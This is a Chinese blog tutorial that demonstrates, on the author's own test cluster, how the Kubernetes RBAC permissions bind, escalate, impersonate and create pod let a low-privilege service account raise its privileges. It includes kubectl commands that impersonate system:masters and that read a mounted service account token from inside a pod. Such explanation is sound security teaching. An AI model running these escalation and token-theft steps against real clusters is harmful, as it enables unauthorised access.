---
title: k8s中的危险权限
tags:
  - kubernetes
categories:
  - 架构
date: 2022-02-06 17:34:46
updated: 2022-02-06 17:34:46
---

# k8s中的危险权限


## 简介
本文列举了k8s中几个危险的权限，危险的权限是什么意思呢，就是说如果某个低权限的用户，因为其拥有某个特殊的权限，那么他就可以通过一些操作来提升自己的权限，从而破坏系统的权限控制体系，并产生意料之外的破坏，以及导致数据的泄露等。

这部分知识比较偏向攻击层面，而不是防守层面。我们通过一步步的手把手的操作，来观察如何突破权限，从而带来隐患的。

存在权限风险的操作主要有4个：bind，escalate，impersonate，create pod，我们一一来分析和测试。

<!-- more -->

以下的操作是基于自己搭建的k8s集群，搭建集群的步骤参考[树莓派搭建k8s集群](https://yizhi.ren/2022/01/25/setupk8s/)。

## bind

user平常也可以bind一个role/clusterrole，但仅当这个user已经拥有这个新的role/clusterrole的全部权限。

当user拥有了这个bind的verb后，就可以没有这个约束，也就可以通过bind高权限的role/clusterrole来提升user的权限。

```
文档：
https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-binding-creation-or-update
https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/
```

举例如下，思路是首先创建一个权限不够的sa，然后我们尝试给sa提升权限，最终一步步看到bind权限带来的效果：

```
# 创建测试用得SA，并设置到kubeconfig中去
# 假设当前在default这个namespace， 我们创建sa叫bindsa，并给他赋予list pod的权限。

~$ alias kl=kubectl
~$ kl create sa bindsa
serviceaccount/bindsa created
~$ kl create role bindsarole --verb=list --resource=pod
role.rbac.authorization.k8s.io/bindsarole created
~$ kl create rolebinding bindingsa --serviceaccount=default:bindsa --role=bindsarole
rolebinding.rbac.authorization.k8s.io/bindingsa created
~$ kl get secret | grep bindsa
bindsa-token-9tq7m    kubernetes.io/service-account-token   3      25m
~$ TOKEN=$(kl get secret bindsa-token-9tq7m -o jsonpath='{.data.token}' | base64 -d)
~$ kl config set-credentials bindsa --token=$TOKEN
User "bindsa" set.
~$ kl config set-context bindsa --cluster kubernetes --user bindsa
Context "bindsa" created.

```

```
测试权限：
# 能list pod但不能list deployment

~$ kl --context=bindsa get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=bindsa get deployments
Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:default:bindsa" cannot list resource "deployments" in API group "apps" in the namespace "default"
```

为了能够拥有查看其他资源的权限，我们需要bind一个clusterole叫system:aggregate-to-view，这个clusterrole已经默认存在的。

```
~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view
error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io is forbidden: User "system:serviceaccount:default:bindsa" cannot create resource "rolebindings" in API group "rbac.authorization.k8s.io" in the namespace "default"
我们发现没法创建rolebinding，那么我们就用高权限的用户给bindsa创建create rolebinding的权限。

~$ kl edit role bindsarole
# 添加create rolebinding的权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:22:05Z"
  name: bindsarole
  namespace: default
  resourceVersion: "1175142"
  uid: c1003090-62ad-4361-bc70-8ca23ce9e637
rules:
- apiGroups:
  - "rbac.authorization.k8s.io"
  resources:
  - rolebindings
  verbs:
  - create
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list
  
  # 再次执行
~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view
error: failed to create rolebinding: rolebindings.rbac.authorization.k8s.io "bindingsaview" is forbidden: user "system:serviceaccount:default:bindsa" (groups=["system:serviceaccounts" "system:serviceaccounts:default" "system:authenticated"]) is attempting to grant RBAC permissions not currently held:
{APIGroups:[""], Resources:["bindings"], Verbs:["get" "list" "watch"]}
......
我们发现没法创建rolebinding，因为新的role/clusterrole包含sa原先没有的权限。
```

到这我们已经发现没有bind权限的话，create rolebinding只能绑定已经有的权限，新权限是不能绑定的。

现在我们给sa设置上新的权限：

```
~$ kl edit role bindsarole
# 添加bind rolebinding的权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:22:05Z"
  name: bindsarole
  namespace: default
  resourceVersion: "1175988"
  uid: c1003090-62ad-4361-bc70-8ca23ce9e637
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles"]
  verbs: ["bind"]
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - rolebindings
  verbs:
  - create
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list
  
# 再次执行
~$ kl --context=bindsa create rolebinding bindingsaview --serviceaccount=default:bindsa --clusterrole=system:aggregate-to-view
rolebinding.rbac.authorization.k8s.io/bindingsaview created
执行成功了
```

可以看到，有了bind权限后，就可以bind成功了。同样bind成功后，再次get deployments等查看其他资源也能成功了。

```
~$ kl --context=bindsa get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=bindsa get deployments
No resources found in default namespace.
```

所以啊，bind权限是很危险的。



## escalate

Escalate权限就是可以更改role/clusterrole的权限，就是可以更改权限的一种权限，如果一个用户有了这个权限，我们就可以拿着他的token，把某个用户的权限调大，然后这个用户的权限自然就变大了。

```
文档：
https://raesene.github.io/blog/2020/12/12/Escalating_Away/
```

举例如下，使用类似上面bind权限的测试思路，首先创建一个权限不够的sa，然后我们尝试给sa提升权限，最终一步步看到escalate权限带来的效果：

```
# 创建测试用得SA，并设置到kubeconfig中去
# 假设当前在default这个namespace， 我们创建sa叫escalatesa，并给他赋予list pod的权限。

~$ alias kl=kubectl
~$ kl create sa escalatesa
serviceaccount/escalatesa created
~$ kl create role escalatesarole --verb=list --resource=pod
role.rbac.authorization.k8s.io/escalatesarole created
~$ kl create rolebinding escalatesa --serviceaccount=default:escalatesa --role=escalatesarole
rolebinding.rbac.authorization.k8s.io/escalatesa created
~$ kl get secret | grep escalatesa
escalatesa-token-xz6zh   kubernetes.io/service-account-token   3      94s
~$ TOKEN=$(kl get secret escalatesa-token-xz6zh -o jsonpath='{.data.token}' | base64 -d)
~$ kl config set-credentials escalatesa --token=$TOKEN
User "escalatesa" set.
~$ kl config set-context escalatesa --cluster kubernetes --user escalatesa
Context "escalatesa" created.

```

```
测试权限：
# 能list pod但不能list deployment

~$ kl --context=escalatesa get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=escalatesa get deployments
Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:default:escalatesa" cannot list resource "deployments" in API group "apps" in the namespace "default"
```

为了能够拥有查看其他资源的权限，我们需要给role escalatesarole增加list deployments的权限。

```
首先需要用高权限账户给escalatesarole添加roles的get和patch权限，不然依靠escalatesarole自己是不能编辑role的。就像刚才我们测试bind权限时需要给bindsa创建create rolebinding的权限的道理一样。

~$ kl edit role escalatesarole
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:56:38Z"
  name: escalatesarole
  namespace: default
  resourceVersion: "1178953"
  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - roles
  verbs:
  - patch
  - get
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list

# 然后执行kl --context=escalatesa edit role escalatesarole
# 添加deployments对应的权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:56:38Z"
  name: escalatesarole
  namespace: default
  resourceVersion: "1181269"
  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - roles
  verbs:
  - patch
  - get
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list
- apiGroups:
  - apps
  resources:
  - deployments
  verbs:
  - list

# 报错，试图提升当前没有的权限，所以即使有了编辑role的权限也没法给role添加新权限。
~$ kl --context=escalatesa edit role escalatesarole
error: roles.rbac.authorization.k8s.io "escalatesarole" could not be patched: roles.rbac.authorization.k8s.io "escalatesarole" is forbidden: user "system:serviceaccount:default:escalatesa" (groups=["system:serviceaccounts" "system:serviceaccounts:default" "system:authenticated"]) is attempting to grant RBAC permissions not currently held:
{APIGroups:["apps"], Resources:["deployments"], Verbs:["list"]}

# 现在我们用高权限账户给escalatesarole加上escalate权限
~$ kl edit role escalatesarole
# 添加escalate权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:56:38Z"
  name: escalatesarole
  namespace: default
  resourceVersion: "1179833"
  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - roles
  verbs:
  - patch
  - get
  - escalate
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list



# 再次尝试用escalatesarole自身的权限来编辑escalatesarole
~$ kl --context=escalatesa edit role escalatesarole
# 添加deployments的list权限
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: "2022-02-07T18:56:38Z"
  name: escalatesarole
  namespace: default
  resourceVersion: "1181374"
  uid: 136d44a1-8ca4-45e1-9a26-26cffba876d7
rules:
- apiGroups:
  - rbac.authorization.k8s.io
  resources:
  - roles
  verbs:
  - patch
  - get
  - escalate
- apiGroups:
  - ""
  resources:
  - pods
  verbs:
  - list
- apiGroups:
  - apps
  resources:
  - deployments
  verbs:
  - list
  
这次是可以成功的
role.rbac.authorization.k8s.io/escalatesarole edited
```

可以看到，有了escalate权限后，就可以编辑role了，即使新增的权限是目前所没有的。同样编辑成功后，再次get deployments等查看其他资源也能成功了。

```
~$ kl --context=escalatesa get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=escalatesa get deployments
No resources found in default namespace.
```

所以啊，escalate权限是很危险的。

## impersonate

当一个user拥有了impersonate权限后，就可以以其他用户的身份去访问集群，这个权限也是一个veb.

```
资料：
https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation
https://docs.bitnami.com/tutorials/simplify-kubernetes-resource-access-rbac-impersonation/
```

impersonate提升权限的方式是低权限用户以高权限用户的身份去访问集群，测试方法跟上面的一样，查看低权限的用户遇到的问题，然后尝试突破权限。看下面的例子：

```
# 创建测试用得SA，并设置到kubeconfig中去
# 假设当前在default这个namespace， 我们创建sa叫impersonatesa，并给他赋予list pod的权限。

~$ alias kl=kubectl
~$ kl create sa impersonatesa
serviceaccount/impersonatesa created
~$ kl create role impersonatesarole --verb=list --resource=pod
role.rbac.authorization.k8s.io/impersonatesarole created
~$ kl create rolebinding impersonatesa --serviceaccount=default:impersonatesa --role=impersonatesarole
rolebinding.rbac.authorization.k8s.io/impersonatesa created
~$ kl get secret | grep impersonatesa
impersonatesa-token-tc95p   kubernetes.io/service-account-token   3      34s
~$ TOKEN=$(kl get secret impersonatesa-token-tc95p -o jsonpath='{.data.token}' | base64 -d)
~$ kl config set-credentials impersonatesa --token=$TOKEN
User "impersonatesa" set.
~$ kl config set-context impersonatesa --cluster kubernetes --user impersonatesa
Context "impersonatesa" created.

```

```
测试权限：
# 能list pod但不能list deployment

~$ kl --context=impersonatesa get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=impersonatesa get deployments
Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:default:impersonatesa" cannot list resource "deployments" in API group "apps" in the namespace "default"
```

为了能够拥有查看其他资源的权限，我们需要给role impersonatesarole增加list deployments的权限。但这次我们不需要增加权限，我们可以通过别的用户的身份来达到资源访问的目的。我们知道system:masters这个group是有最大权限的，所以如果我们以system:masters这个group来list deployment，那就可以达到目的了。

```
~$ kl --context=impersonatesa get deployments --as any --as-group system:masters
Error from server (Forbidden): users "any" is forbidden: User "system:serviceaccount:default:impersonatesa" cannot impersonate resource "users" in API group "" at the cluster scope
```

但是我们看到尝试`--as`和`--as-group`的时候失败了，当然他的原因是当前sa没有impersonate权限。所以我们通过高权限账户给impersonatesa增加impersonate权限。

```
# 注意impersonat权限得用clusterrolebinding才行，上面我们从错误信息中也可以看到提示：
# cannot impersonate resource "users" in API group "" at the cluster scope

~$ kl create clusterrole impersonatesaclusterrole --verb=impersonate --resource=users,groups
clusterrole.rbac.authorization.k8s.io/impersonatesaclusterrole created

~$ kl create clusterrolebinding impersonatesa --serviceaccount=default:impersonatesa --clusterrole=impersonatesaclusterrole
clusterrolebinding.rbac.authorization.k8s.io/impersonatesa created
```

我们再来尝试执行：

```
~$ kl --context=impersonatesa get deployments --as any --as-group system:masters
No resources found in default namespace.
```

成功了，所以impersonate权限是很危险的。



## create pod

创建pod的权限为什么会存在隐患呢？ 因为创建pod的时候可以配置serviceAccountName，于是这个pod中就可以挂载一个高权限的account，这样就可以在pod中拿到token，就可以拥有高权限了。

```
https://www.impidio.com/blog/kubernetes-rbac-security-pitfalls

Be aware that users with the permission to create pods can escalate their privileges easily. This is because any service account can be provided in the pod specification. The token secret of the selected service account will be mapped into the container and it can be used for API access. So, the create pod privilege implicitly allows to impersonate any service account within the same namespace.
```

我们创建两个sa，一个有创建pod的权限还有list pod的权限；一个只有list deployments的权限。

```
~$ alias kl=kubectl

# user createpod
~$ kl create sa createpod
serviceaccount/createpod created
~$ kl create role createpodrole --verb=list,create --resource=pod
role.rbac.authorization.k8s.io/createpodrole created
~$ kl create rolebinding createpod --serviceaccount=default:createpod --role=createpodrole
rolebinding.rbac.authorization.k8s.io/createpod created
~$ kl get secret | grep createpod
createpod-token-dl28b       kubernetes.io/service-account-token   3      66s
~$ TOKEN=$(kl get secret createpod-token-dl28b -o jsonpath='{.data.token}' | base64 -d)
~$ kl config set-credentials createpod --token=$TOKEN
User "createpod" set.
~$ kl config set-context createpod --cluster kubernetes --user createpod
Context "createpod" created.

# user listdeployments
~$ kl create sa listdeployments
serviceaccount/listdeployments created
~$ kl create role listdeploymentsrole --verb=list --resource=deployments
role.rbac.authorization.k8s.io/listdeploymentsrole created
~$ kl create rolebinding listdeployments --serviceaccount=default:listdeployments --role=listdeploymentsrole
rolebinding.rbac.authorization.k8s.io/listdeployments created
```

测试权限：

```
# 能list pod但不能list deployment

~$ kl --context=createpod get pod
NAME   READY   STATUS    RESTARTS   AGE
......
~$ kl --context=createpod get deployments
Error from server (Forbidden): deployments.apps is forbidden: User "system:serviceaccount:default:createpod" cannot list resource "deployments" in API group "apps" in the namespace "default"
```

现在我们尝试使用create pod来突破权限来list deployments.

```
vi busy.yaml
# 注意配置serviceAccountName: listdeployments
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: busy
  name: busy
spec:
  serviceAccountName: listdeployments
  containers:
  - image: busybox
    name: busy
    args:
    - sh
    - -c
    - "sleep 1d"
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}


~$ kl apply -f busy.yaml
pod/busy created

# connect to pod
~$ kl exec busy -it -- sh
/ # cat /var/run/secrets/kubernetes.io/serviceaccount/token
...... # 可以看到token是可以获取到的


# 我们离开pod然后记下这个token
~$ TOKEN=$(kl exec busy -it -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)
# 然后同样的方法配置到kubeconfig中去
~$ kl config set-credentials listdeployments --token=$TOKEN
User "listdeployments" set.
~$ kl config set-context listdeployments --cluster kubernetes --user listdeployments
Context "listdeployments" created.
```

这时候我们再来尝试执行命令：

```
~$ kl --context=createpod get pod
NAME   READY   STATUS    RESTARTS   AGE
...
~$ kl --context=listdeployments get deployments
No resources found in default namespace.
...
```

可以看到我们成功list了deployments。所以create pod的权限也是很危险的。


## 参考
[树莓派搭建k8s集群](https://yizhi.ren/2022/01/25/setupk8s/)
[Restrictions on role binding creation or update](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#restrictions-on-role-binding-creation-or-update)
[Getting into a bind with Kubernetes](https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/)
[Escalating Away](https://raesene.github.io/blog/2020/12/12/Escalating_Away/)
[User impersonation](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)
[Simplify Kubernetes Resource Access Control using RBAC Impersonation](https://docs.bitnami.com/tutorials/simplify-kubernetes-resource-access-rbac-impersonation/)
[Kubernetes RBAC Security Pitfalls](https://www.impidio.com/blog/kubernetes-rbac-security-pitfalls)

